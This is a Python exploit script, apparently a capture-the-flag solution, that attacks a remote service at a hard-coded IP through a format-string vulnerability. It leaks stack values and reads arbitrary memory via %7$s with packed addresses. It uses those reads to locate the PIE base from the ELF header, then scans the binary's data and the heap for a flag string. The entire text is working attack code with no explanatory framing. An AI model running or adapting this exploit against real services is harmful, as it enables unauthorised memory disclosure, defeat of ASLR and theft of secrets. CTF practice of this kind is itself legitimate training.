#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.02)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    for _ in range(6):
        d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
        if m: return int(m.group(1))
        time.sleep(0.1)
    return None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    for _ in range(8):
        a15=leak_lld(s,15)
        if a15:
            start=a15&~0xfff
            for d in range(0,0x20000,0x1000):
                r=readmem(s,start-d)
                if r.startswith(b'\x7fELF'): return start-d
    return None

s=newconn(); pie=get_pie(s)
print("pie=",hex(pie))
hits=[]
# binary data region, fixed step
for rel in range(0x2000,0x9000,0x100):
    r=readmem(s,pie+rel)
    strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
    if b'PTITCTF' in strb or b'2026' in strb or (b'{' in strb and b'}' in strb):
        print("BIN MARK",hex(pie+rel),repr(strb[:200])); hits.append(('bin',pie+rel,strb))
# heap region from arg14, fixed step
a14=leak_lld(s,14)
print("heap ptr=",hex(a14))
if a14:
    for rel in range(0,0x40000,0x200):
        r=readmem(s,a14+rel)
        strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
        if b'PTITCTF' in strb or b'2026' in strb or (b'{' in strb and b'}' in strb):
            print("HEAP MARK",hex(a14+rel),repr(strb[:200])); hits.append(('heap',a14+rel,strb))
print("total hits",len(hits))
s.close()
